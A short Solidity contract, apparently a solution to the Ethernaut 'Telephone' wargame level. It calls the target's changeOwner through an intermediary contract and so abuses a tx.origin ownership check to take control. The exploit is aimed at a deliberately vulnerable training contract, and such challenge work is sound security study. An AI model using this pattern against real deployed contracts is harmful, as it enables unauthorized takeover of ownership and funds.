pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Draino {

    Telephone telephone;

    constructor(address $your_ethernaut_instance_here) {
        telephone = Telephone($your_ethernaut_instance_here);
    }

    function dial() public {
        telephone.changeOwner(msg.sender);
    }
}